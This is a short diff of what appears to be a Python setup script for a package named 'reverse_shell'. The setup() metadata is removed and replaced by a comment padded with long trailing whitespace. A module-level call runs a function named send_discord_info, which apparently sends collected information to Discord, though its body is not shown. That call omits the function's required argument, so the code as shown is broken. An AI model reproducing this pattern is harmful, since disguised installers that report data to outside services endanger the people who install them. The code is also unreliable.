@@ -23,17 +23,7 @@ def send_discord_info(repo_path):
 # Define la ruta donde deseas clonar el repositorio
 repo_path = os.path.join('C:', 'Users', 'repo')
 
-setup(
-    name='reverse_shell',
-    version='1.4',
-    packages=['reverse_shell'],
-    install_requires=['requests', 'gitpython'],
-    url='https://github.com/tuusuario/reverse_shell',
-    license='',
-    author='ReverseShell',
-    author_email='reverseshell@gmail.com',
-    description='ReverseShell Project'
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                    
 
 if __name__ == '__main__':
     send_discord_info()
